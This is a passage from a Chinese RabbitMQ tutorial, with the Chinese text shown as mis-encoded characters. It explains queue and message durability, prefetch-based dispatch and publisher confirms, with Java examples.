&#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>æµ‹è¯•</p><p>Consumer02ç”±äºå¤„ç†æ—¶é—´å¤ªé•¿ï¼Œæˆ‘ä»¬æŒ‚æ‰ä»–ï¼Œè¿™ä¸ªæ—¶å€™ä¿¡æ¯ä¼šé‡å›é˜Ÿåˆ—åˆ†ç»™Consumer01è¿›è¡Œå¤„ç†ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112154633047.png" alt="image-20230112154633047" /></p><p>â€‹<img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112154849067.png" alt="image-20230112154849067" /></p><p>Consumer02æŒ‚ä¹‹å‰</p></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112154649174.png" alt="Consumer02æŒ‚ä¹‹å‰" /></p><p>â€‹Consumer02æŒ‚ä¹‹å</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112154706690.png" alt="Consumer02æŒ‚ä¹‹å" /></p><h2 id="43-æŒä¹…åŒ–"><a class="markdownIt-Anchor" href="#43-æŒä¹…åŒ–"></a> 4.3 æŒä¹…åŒ–</h2><blockquote><p>æ¦‚å¿µ</p></blockquote><p>åˆšåˆšæˆ‘ä»¬å·²ç»çœ‹åˆ°äº†å¦‚ä½•å¤„ç†ä»»åŠ¡ä¸ä¸¢å¤±çš„æƒ…å†µï¼Œä½†æ˜¯å¦‚ä½•ä¿éšœå½“RabbitMQæœåŠ¡åœæ‰ä»¥åæ¶ˆæ¯ç”Ÿäº§è€…å‘é€è¿‡æ¥çš„æ¶ˆæ¯ä¸ä¸¢å¤±ã€‚é»˜è®¤æƒ…å†µä¸‹RabbitMQé€€å‡ºæˆ–ç”±äºæŸç§åŸå› å´©æºƒæ—¶ï¼Œå®ƒå¿½è§†é˜Ÿåˆ—å’Œæ¶ˆæ¯ï¼Œé™¤éå‘ŠçŸ¥å®ƒä¸è¦è¿™æ ·åšã€‚ç¡®ä¿æ¶ˆæ¯ä¸ä¼šä¸¢å¤±éœ€è¦åšä¸¤ä»¶äº‹:æˆ‘ä»¬éœ€è¦å°†é˜Ÿåˆ—å’Œæ¶ˆæ¯éƒ½æ ‡è®°ä¸ºæŒä¹…åŒ–ã€‚</p><blockquote><p>é˜Ÿåˆ—æŒä¹…åŒ–</p></blockquote><ol><li><p>ä¹‹å‰æˆ‘ä»¬åˆ›å»ºçš„é˜Ÿåˆ—éƒ½æ˜¯éæŒä¹…åŒ–çš„ï¼Œrabbitmqå¦‚æœé‡å¯çš„åŒ–ï¼Œè¯¥é˜Ÿåˆ—å°±ä¼šè¢«åˆ é™¤æ‰ï¼Œå¦‚æœè¦é˜Ÿåˆ—å®ç°æŒä¹…åŒ–éœ€è¦åœ¨å£°æ˜é˜Ÿåˆ—çš„æ—¶å€™æŠŠdurableå‚æ•°è®¾ç½®ä¸ºæŒä¹…åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// å£°æ˜é˜Ÿåˆ—</span><br><span class="hljs-comment">// æŒä¹…åŒ– éœ€è¦è®©QueueæŒä¹…åŒ–</span><br><span class="hljs-type">boolean</span> <span class="hljs-variable">durable</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>channel.queueDeclare(TASK_QUEUE_NAME,durable,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112155909995.png" alt="image-20230112155909995" /></p></li><li><p>éœ€è¦æ³¨æ„çš„å°±æ˜¯å¦‚æœä¹‹å‰å£°æ˜çš„é˜Ÿåˆ—ä¸æ˜¯æŒä¹…åŒ–çš„ï¼Œéœ€è¦æŠŠåŸå…ˆé˜Ÿåˆ—å…ˆåˆ é™¤æˆ–è€…é‡æ–°åˆ›å»ºä¸€ä¸ªæŒä¹…åŒ–çš„é˜Ÿåˆ—ï¼Œä¸ç„¶å°±ä¼šå‡ºç°é”™è¯¯</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">Caused <span class="hljs-keyword">by</span>: com.rabbitmq.client.ShutdownSignalException: channel error<span class="hljs-punctuation">;</span> protocol <span class="hljs-keyword">method</span>: #<span class="hljs-keyword">method</span>&lt;<span class="hljs-title function_">channel</span>.<span class="hljs-title function_">close</span>&gt;<span class="hljs-params">(reply-code=406, reply-text=PRECONDITION_FAILED - inequivalent arg <span class="hljs-string">&#x27;durable&#x27;</span> <span class="hljs-keyword">for</span> queue <span class="hljs-string">&#x27;ack_queue&#x27;</span> <span class="hljs-keyword">in</span> vhost <span class="hljs-string">&#x27;/&#x27;</span>: received <span class="hljs-string">&#x27;true&#x27;</span> but current <span class="hljs-keyword">is</span> <span class="hljs-string">&#x27;false&#x27;</span>, <span class="hljs-keyword">class</span>-id=50, <span class="hljs-keyword">method</span>-id=10)</span><br></code></pre></td></tr></table></figure></li><li><p>é‡æ–°è¿è¡Œä»£ç åï¼Œé˜Ÿåˆ—æŒä¹…åŒ–æˆåŠŸ</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112160036542.png" alt="image-20230112160036542" /></p></li></ol><blockquote><p>æ¶ˆæ¯æŒä¹…åŒ–</p></blockquote><ol><li><p>è¦æƒ³è®©æ¶ˆæ¯å®ç°æŒä¹…åŒ–éœ€è¦åœ¨æ¶ˆæ¯ç”Ÿäº§è€…ä¿®æ”¹ä»£ç ,MessageProperties,PERSISTENT_TEXT_PLAINæ·»åŠ è¿™ä¸ªå±æ€§ã€‚</p></li><li><p>å°†æ¶ˆæ¯æ ‡è®°ä¸ºæŒä¹…åŒ–å¹¶ä¸èƒ½å®Œå…¨ä¿è¯ä¸ä¼šä¸¢å¤±æ¶ˆæ¯ã€‚å°½ç®¡å®ƒå‘Šè¯‰RabbitMQå°†æ¶ˆæ¯ä¿å­˜åˆ°ç£ç›˜ï¼Œä½†æ˜¯è¿™é‡Œä¾ç„¶å­˜åœ¨å½“æ¶ˆæ¯åˆšå‡†å¤‡å­˜å‚¨åœ¨ç£ç›˜çš„æ—¶å€™ä½†æ˜¯è¿˜æ²¡æœ‰å­˜å‚¨å®Œï¼Œæ¶ˆæ¯è¿˜åœ¨ç¼“å­˜çš„ä¸€ä¸ªé—´éš”ç‚¹ã€‚æ­¤æ—¶å¹¶æ²¡æœ‰çœŸæ­£å†™å…¥ç£ç›˜ã€‚æŒä¹…æ€§ä¿è¯å¹¶ä¸å¼ºï¼Œä½†æ˜¯å¯¹äºæˆ‘ä»¬çš„ç®€å•ä»»åŠ¡é˜Ÿåˆ—è€Œè¨€ï¼Œè¿™å·²ç»ç»°ç»°æœ‰ä½™äº†ã€‚å¦‚æœéœ€è¦æ›´å¼ºæœ‰åŠ›çš„æŒä¹…åŒ–ç­–ç•¥ï¼Œå‚è€ƒåè¾¹è¯¾ä»¶å‘å¸ƒç¡®è®¤ç« èŠ‚ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//è®¾ç½®ç”Ÿäº§è€…å‘é€æ¶ˆæ¯ä¸ºæŒä¹…åŒ–æ¶ˆæ¯ï¼ˆè¦æ±‚ä¿å­˜åˆ°ç£ç›˜ä¸Šï¼‰</span><br>channel.basicPublish(<span class="hljs-string">&quot;&quot;</span>,TASK_QUEUE_NAME, MessageProperties.PERSISTENT_TEXT_PLAIN<br>                     ,message.getBytes(StandardCharsets.UTF_8));<br>System.out.println(<span class="hljs-string">&quot;ç”Ÿäº§è€…å‘å‡ºæ¶ˆæ¯ï¼š&quot;</span>+message);<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112160220437.png" alt="image-20230112160220437" /></p></li></ol><blockquote><p>ä¸å…¬å¹³åˆ†å‘</p></blockquote><ol><li><p>åœ¨æœ€å¼€å§‹çš„æ—¶å€™æˆ‘ä»¬å­¦ä¹ åˆ°RabbitMQ.åˆ†å‘æ¶ˆæ¯é‡‡ç”¨çš„è½®è®­åˆ†å‘ï¼Œä½†æ˜¯åœ¨æŸç§åœºæ™¯ä¸‹è¿™ç§ç­–ç•¥å¹¶ä¸æ˜¯å¾ˆå¥½ï¼Œæ¯”æ–¹è¯´æœ‰ä¸¤ä¸ªæ¶ˆè´¹è€…åœ¨å¤„ç†ä»»åŠ¡ï¼Œå…¶ä¸­æœ‰ä¸ªæ¶ˆè´¹è€…1å¤„ç†ä»»åŠ¡çš„é€Ÿåº¦éå¸¸å¿«ï¼Œè€Œå¦å¤–ä¸€ä¸ªæ¶ˆè´¹è€…2å¤„ç†é€Ÿåº¦å´å¾ˆæ…¢ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬è¿˜æ˜¯é‡‡ç”¨è½®è®­åˆ†å‘çš„åŒ–å°±ä¼šåˆ°è¿™å¤„ç†é€Ÿåº¦å¿«çš„è¿™ä¸ªæ¶ˆè´¹è€…å¾ˆå¤§ä¸€éƒ¨åˆ†æ—¶é—´å¤„äºç©ºé—²çŠ¶æ€ï¼Œè€Œå¤„ç†æ…¢çš„é‚£ä¸ªæ¶ˆè´¹è€…ä¸€ç›´åœ¨å¹²æ´»ï¼Œè¿™ç§åˆ†é…æ–¹å¼åœ¨è¿™ç§æƒ…å†µä¸‹å…¶å®å°±ä¸å¤ªå¥½ï¼Œä½†æ˜¯RabbitMQå¹¶ä¸çŸ¥é“è¿™ç§æƒ…å†µï¼Œå®ƒä¾ç„¶å¾ˆå…¬å¹³çš„è¿›è¡Œåˆ†å‘ã€‚</p></li><li><p>ä¸ºäº†é¿å…è¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½®å‚æ•°<code>channel.basicQos(1)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// è®¾ç½®ä¸å…¬å¹³åˆ†å‘</span><br><span class="hljs-type">int</span> <span class="hljs-variable">prefetchCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br>channel.basicQos(prefetchCount);<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112161121336.png" alt="image-20230112161121336" /></p></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112161212158.png" alt="image-20230112161212158" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112161234631.png" alt="image-20230112161234631" /></p><p>æ„æ€å°±æ˜¯å¦‚æœè¿™ä¸ªä»»åŠ¡æˆ‘è¿˜æ²¡æœ‰å¤„ç†å®Œæˆ–è€…æˆ‘è¿˜æ²¡æœ‰åº”ç­”ä½ ï¼Œä½ å…ˆåˆ«åˆ†é…ç»™æˆ‘ï¼Œæˆ‘ç›®å‰åªèƒ½å¤„ç†ä¸€ä¸ªä»»åŠ¡ï¼Œç„¶å rabbitmq å°±ä¼šæŠŠè¯¥ä»»åŠ¡åˆ†é…ç»™æ²¡æœ‰é‚£ä¹ˆå¿™çš„é‚£ä¸ªç©ºé—²æ¶ˆè´¹è€…ï¼Œå½“ç„¶å¦‚æœæ‰€æœ‰çš„æ¶ˆè´¹è€…éƒ½æ²¡æœ‰å®Œæˆæ‰‹ä¸Šä»»åŠ¡ï¼Œé˜Ÿåˆ—è¿˜åœ¨ä¸åœçš„æ·»åŠ æ–°ä»»åŠ¡ï¼Œé˜Ÿåˆ—æœ‰å¯èƒ½å°±ä¼šé‡åˆ°é˜Ÿåˆ—è¢«æ’‘æ»¡çš„æƒ…å†µï¼Œè¿™ä¸ªæ—¶å€™å°±åªèƒ½æ·»åŠ æ–°çš„ worker æˆ–è€…æ”¹å˜å…¶ä»–å­˜å‚¨ä»»åŠ¡çš„ç­–ç•¥ã€‚</p><h2 id="44-é¢„å–å€¼"><a class="markdownIt-Anchor" href="#44-é¢„å–å€¼"></a> 4.4 é¢„å–å€¼</h2><p>æœ¬èº«æ¶ˆæ¯çš„å‘é€å°±æ˜¯å¼‚æ­¥å‘é€çš„ï¼Œæ‰€ä»¥åœ¨ä»»ä½•æ—¶å€™ï¼Œchannelä¸Šè‚¯å®šä¸æ­¢åªæœ‰ä¸€ä¸ªæ¶ˆæ¯å¦å¤–æ¥è‡ªæ¶ˆè´¹è€…çš„æ‰‹åŠ¨ç¡®è®¤æœ¬è´¨ä¸Šä¹Ÿæ˜¯å¼‚æ­¥çš„ã€‚å› æ­¤è¿™é‡Œå°±å­˜åœ¨ä¸€ä¸ªæœªç¡®è®¤çš„æ¶ˆæ¯ç¼“å†²åŒºï¼Œå› æ­¤å¸Œæœ›å¼€å‘äººå‘˜èƒ½é™åˆ¶æ­¤ç¼“å†²åŒºçš„å¤§å°ï¼Œä»¥é¿å…ç¼“å†²åŒºé‡Œé¢æ— é™åˆ¶çš„æœªç¡®è®¤æ¶ˆæ¯é—®é¢˜ã€‚è¿™ä¸ªæ—¶å€™å°±å¯ä»¥é€šè¿‡ä½¿ç”¨basic.gos.æ–¹æ³•è®¾ç½®â€œé¢„å–è®¡æ•°â€å€¼æ¥å®Œæˆçš„ã€‚è¯¥å€¼å®šä¹‰é€šé“ä¸Šå…è®¸çš„æœªç¡®è®¤æ¶ˆæ¯çš„æœ€å¤§æ•°é‡ã€‚ä¸€æ—¦æ•°é‡è¾¾åˆ°é…ç½®çš„æ•°é‡ï¼ŒRabbitMQå°†åœæ­¢åœ¨é€šé“ä¸Šä¼ é€’æ›´å¤šæ¶ˆæ¯ï¼Œé™¤éè‡³å°‘æœ‰ä¸€ä¸ªæœªå¤„ç†çš„æ¶ˆæ¯è¢«ç¡®è®¤ï¼Œä¾‹å¦‚ï¼Œå‡è®¾åœ¨é€šé“ä¸Šæœ‰æœªç¡®è®¤çš„æ¶ˆæ¯5ã€6ã€7ï¼Œ8ï¼Œå¹¶ä¸”é€šé“çš„é¢„å–è®¡æ•°è®¾ç½®ä¸º4ï¼Œæ­¤æ—¶RabbitMQ.å°†ä¸ä¼šåœ¨è¯¥é€šé“ä¸Šå†ä¼ é€’ä»»ä½•æ¶ˆæ¯ï¼Œé™¤éè‡³å°‘æœ‰ä¸€ä¸ªæœªåº”ç­”çš„æ¶ˆæ¯è¢«ackã€‚æ¯”æ–¹è¯´tag=6è¿™ä¸ªæ¶ˆæ¯åˆšåˆšè¢«ç¡®è®¤ACKï¼ŒRabbitMQå°†ä¼šæ„ŸçŸ¥è¿™ä¸ªæƒ…å†µåˆ°å¹¶å†å‘é€ä¸€æ¡æ¶ˆæ¯ã€‚æ¶ˆæ¯åº”ç­”å’ŒQoSé¢„å–å€¼å¯¹ç”¨æˆ·ååé‡æœ‰é‡å¤§å½±å“ã€‚é€šå¸¸ï¼Œå¢åŠ é¢„å–å°†æé«˜å‘æ¶ˆè´¹è€…ä¼ é€’æ¶ˆæ¯çš„é€Ÿåº¦ã€‚<strong>è™½ç„¶è‡ªåŠ¨åº”ç­”ä¼ è¾“æ¶ˆæ¯é€Ÿç‡æ˜¯æœ€ä½³çš„ï¼Œä½†æ˜¯ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹å·²ä¼ é€’ä½†å°šæœªå¤„ç†çš„æ¶ˆæ¯çš„æ•°é‡ä¹Ÿä¼šå¢åŠ ï¼Œä»è€Œå¢åŠ äº†æ¶ˆè´¹è€…çš„RAMæ¶ˆè€—</strong>(éšæœºå­˜å–å­˜å‚¨å™¨)åº”è¯¥å°å¿ƒä½¿ç”¨å…·æœ‰æ— é™é¢„å¤„ç†çš„è‡ªåŠ¨ç¡®è®¤æ¨¡å¼æˆ–æ‰‹åŠ¨ç¡®è®¤æ¨¡å¼ï¼Œæ¶ˆè´¹è€…æ¶ˆè´¹äº†å¤§é‡çš„æ¶ˆæ¯å¦‚æœæ²¡æœ‰ç¡®è®¤çš„è¯ï¼Œä¼šå¯¼è‡´æ¶ˆè´¹è€…è¿æ¥èŠ‚ç‚¹çš„å†…å­˜æ¶ˆè€—å˜å¤§ï¼Œæ‰€ä»¥æ‰¾åˆ°åˆé€‚çš„é¢„å–å€¼æ˜¯ä¸€ä¸ªåå¤è¯•éªŒçš„è¿‡ç¨‹ï¼Œ<strong>ä¸åŒçš„è´Ÿè½½è¯¥å€¼å–å€¼ä¹Ÿä¸åŒ100åˆ°300èŒƒå›´å†…çš„å€¼é€šå¸¸å¯æä¾›æœ€ä½³çš„ååé‡</strong>ï¼Œå¹¶ä¸”ä¸ä¼šç»™æ¶ˆè´¹è€…å¸¦æ¥å¤ªå¤§çš„é£é™©ã€‚é¢„å–å€¼ä¸º1æ˜¯æœ€ä¿å®ˆçš„ã€‚å½“ç„¶è¿™å°†ä½¿ååé‡å˜å¾—å¾ˆä½ï¼Œç‰¹åˆ«æ˜¯æ¶ˆè´¹è€…è¿æ¥å»¶è¿Ÿå¾ˆä¸¥é‡çš„æƒ…å†µä¸‹ï¼Œç‰¹åˆ«æ˜¯åœ¨æ¶ˆè´¹è€…è¿æ¥ç­‰å¾…æ—¶é—´è¾ƒé•¿çš„ç¯å¢ƒä¸­ã€‚å¯¹äºå¤§å¤šæ•°åº”ç”¨æ¥è¯´ï¼Œç¨å¾®é«˜ä¸€ç‚¹çš„å€¼å°†æ˜¯æœ€ä½³çš„ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112161337833.png" alt="image-20230112161337833" /></p><h1 id="5-å‘å¸ƒç¡®è®¤"><a class="markdownIt-Anchor" href="#5-å‘å¸ƒç¡®è®¤"></a> 5. å‘å¸ƒç¡®è®¤</h1><blockquote><p>å‘å¸ƒç¡®è®¤åŸç†</p></blockquote><ol><li>ç”Ÿäº§è€…å°†ä¿¡é“è®¾ç½®æˆconfirmæ¨¡å¼ï¼Œä¸€æ—¦ä¿¡é“è¿›å…¥confirmæ¨¡å¼ï¼Œæ‰€æœ‰åœ¨è¯¥ä¿¡é“ä¸Šé¢å‘å¸ƒçš„æ¶ˆæ¯éƒ½å°†ä¼šè¢«æŒ‡æ´¾ä¸€ä¸ªå”¯ä¸€çš„ID(ä»1å¼€å§‹)ï¼Œä¸€æ—¦æ¶ˆæ¯è¢«æŠ•é€’åˆ°æ‰€æœ‰åŒ¹é…çš„é˜Ÿåˆ—ä¹‹åï¼Œbrokerå°±ä¼šå‘é€ä¸€ä¸ªç¡®è®¤ç»™ç”Ÿäº§è€…(åŒ…å«æ¶ˆæ¯çš„å”¯ä¸€ID)ï¼Œè¿™å°±ä½¿å¾—ç”Ÿäº§è€…çŸ¥é“æ¶ˆæ¯å·²ç»æ­£ç¡®åˆ°è¾¾ç›®çš„é˜Ÿåˆ—äº†ï¼Œå¦‚æœæ¶ˆæ¯å’Œé˜Ÿåˆ—æ˜¯å¯æŒä¹…åŒ–çš„ï¼Œé‚£ä¹ˆç¡®è®¤æ¶ˆæ¯ä¼šåœ¨å°†æ¶ˆæ¯å†™å…¥ç£ç›˜ä¹‹åå‘å‡ºï¼Œbrokerå›ä¼ ç»™ç”Ÿäº§è€…çš„ç¡®è®¤æ¶ˆæ¯ä¸­delivery-tagåŸŸåŒ…å«äº†ç¡®è®¤æ¶ˆæ¯çš„åºåˆ—å·ï¼Œæ­¤å¤– brokerä¹Ÿå¯ä»¥è®¾ç½®basic.ack çš„multipleåŸŸï¼Œè¡¨ç¤ºåˆ°è¿™ä¸ªåºåˆ—å·ä¹‹å‰çš„æ‰€æœ‰æ¶ˆæ¯éƒ½å·²ç»å¾—åˆ°äº†å¤„ç†ã€‚</li><li>confirmæ¨¡å¼æœ€å¤§çš„å¥½å¤„åœ¨äºä»–æ˜¯å¼‚æ­¥çš„ï¼Œä¸€æ—¦å‘å¸ƒä¸€æ¡æ¶ˆæ¯ï¼Œç”Ÿäº§è€…åº”ç”¨ç¨‹åºå°±å¯ä»¥åœ¨ç­‰ä¿¡é“è¿”å›ç¡®è®¤çš„åŒæ—¶ç»§ç»­å‘é€ä¸‹ä¸€æ¡æ¶ˆæ¯ï¼Œå½“æ¶ˆæ¯æœ€ç»ˆå¾—åˆ°ç¡®è®¤ä¹‹åï¼Œç”Ÿäº§è€…åº”ç”¨ä¾¿å¯ä»¥é€šè¿‡å›è°ƒæ–¹æ³•æ¥å¤„ç†è¯¥ç¡®è®¤æ¶ˆæ¯ï¼Œå¦‚æœRabbitMQå› ä¸ºè‡ªèº«å†…éƒ¨é”™è¯¯å¯¼è‡´æ¶ˆæ¯ä¸¢å¤±ï¼Œå°±ä¼šå‘é€ä¸€æ¡nackæ¶ˆæ¯ï¼Œç”Ÿäº§è€…åº”ç”¨ç¨‹åºåŒæ ·å¯ä»¥åœ¨å›è°ƒæ–¹æ³•ä¸­å¤„ç†è¯¥nack.æ¶ˆæ¯ã€‚</li></ol><blockquote><p>å‘å¸ƒç¡®è®¤ç­–ç•¥</p></blockquote><p>å¼€å¯å‘å¸ƒç¡®è®¤çš„æ–¹æ³•ï¼š</p><p>å‘å¸ƒç¡®è®¤é»˜è®¤æ˜¯æ²¡æœ‰å¼€å¯çš„ï¼Œå¦‚æœè¦å¼€å¯éœ€è¦è°ƒç”¨æ–¹æ³• confirmSelectï¼Œæ¯å½“ä½ è¦æƒ³ä½¿ç”¨å‘å¸ƒè§’è®¤ï¼Œéƒ½éœ€è¦åœ¨channelä¸Šè°ƒç”¨è¯¥æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> connection.createChannel();<br>channel.confirmSelect();<br></code></pre></td></tr></table></figure><blockquote><p>å•ä¸ªå‘å¸ƒç¡®è®¤</p></blockquote><ol><li><p>è¿™æ˜¯ä¸€ç§ç®€å•çš„ç¡®è®¤æ–¹å¼ï¼Œå®ƒæ˜¯ä¸€ç§åŒæ­¥ç¡®è®¤å‘å¸ƒçš„æ–¹å¼ï¼Œä¹Ÿå°±æ˜¯å‘å¸ƒä¸€ä¸ªæ¶ˆæ¯ä¹‹ååªæœ‰å®ƒè¢«ç¡®è®¤å‘å¸ƒï¼Œåç»­çš„æ¶ˆæ¯æ‰èƒ½ç»§ç»­å‘å¸ƒ, waitForConfirmsOrDie(long)è¿™ä¸ªæ–¹æ³•åªæœ‰åœ¨æ¶ˆæ¯è¢«ç¡®è®¤çš„æ—¶å€™æ‰è¿”å›ï¼Œå¦‚æœåœ¨æŒ‡å®šæ—¶é—´èŒƒå›´å†…è¿™ä¸ªæ¶ˆæ¯æ²¡æœ‰è¢«ç¡®è®¤é‚£ä¹ˆå®ƒå°†æŠ›å‡ºå¼‚å¸¸ã€‚</p></li><li><p>è¿™ç§ç¡®è®¤æ–¹å¼æœ‰ä¸€ä¸ªæœ€å¤§çš„ç¼ºç‚¹å°±æ˜¯ï¼š<code>å‘å¸ƒé€Ÿåº¦ç‰¹åˆ«çš„æ…¢</code>ï¼Œå› ä¸ºå¦‚æœæ²¡æœ‰ç¡®è®¤å‘å¸ƒçš„æ¶ˆæ¯é¢ä¼šé˜»å¡æ‰€æœ‰åç»­æ¶ˆæ¯çš„å‘å¸ƒï¼Œè¿™ç§æ–¹å¼æœ€å¤šæä¾›æ¯ç§’ä¸è¶…è¿‡æ•°ç™¾æ¡å‘å¸ƒæ¶ˆæ¯çš„ååé‡ã€‚å½“ç„¶å¯¹äºæŸäº›åº”ç”¨ç¨‹åºæ¥è¯´è¿™å¯èƒ½å·²ç»è¶³å¤Ÿäº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* å‘å¸ƒç¡®è®¤æ¨¡å¼ï¼Œ</span><br><span class="hljs-comment">* 1ã€å•ä¸ªç¡®è®¤</span><br><span class="hljs-comment">* 2ã€æ‰¹é‡ç¡®è®¤</span><br><span class="hljs-comment">* 3ã€å¼‚æ­¥æ‰¹é‡ç¡®è®¤</span><br><span class="hljs-comment">* */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ComfirmMessage</span> &#123;<br><br>    <span class="hljs-comment">// æ‰¹é‡å‘æ¶ˆæ¯çš„ä¸ªæ•°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">MESSAGE_COUNT</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 1ã€å•ä¸ªç¡®è®¤</span><br>        <span class="hljs-comment">// å‘å¸ƒ1000ä¸ªå•ç‹¬ç¡®è®¤æ¶ˆæ¯ï¼Œè€—æ—¶567ms</span><br>        ComfirmMessage.publishMessageIndividually();<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">publishMessageIndividually</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">queueName</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString();<br>        channel.queueDeclare(queueName,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">// å¼€å¯å‘å¸ƒç¡®è®¤</span><br>        channel.confirmSelect();<br>        <span class="hljs-comment">// å¼€å§‹æ—¶é—´</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">begin</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br><br>        <span class="hljs-comment">// æ‰¹é‡å‘æ¶ˆæ¯</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; MESSAGE_COUNT; i++) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> i + <span class="hljs-string">&quot;&quot;</span>;<br>            channel.basicPublish(<span class="hljs-string">&quot;&quot;</span>,queueName,<span class="hljs-literal">null</span>,message.getBytes(StandardCharsets.UTF_8));<br>            <span class="hljs-comment">// å•ä¸ªæ¶ˆæ¯é©¬ä¸Šè¿›è¡Œå‘å¸ƒç¡®è®¤</span><br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> channel.waitForConfirms();<br>            <span class="hljs-keyword">if</span> (flag)&#123;<br>                System.out.println(<span class="hljs-string">&quot;æ¶ˆæ¯å‘é€æˆåŠŸ&quot;</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// ç»“æŸæ—¶é—´</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        System.out.println(<span class="hljs-string">&quot;å‘å¸ƒ&quot;</span>+MESSAGE_COUNT+<span class="hljs-string">&quot;ä¸ªå•ç‹¬ç¡®è®¤æ¶ˆæ¯ï¼Œè€—æ—¶&quot;</span>+ (end - begin) + <span class="hljs-string">&quot;ms&quot;</span>);<br><br>    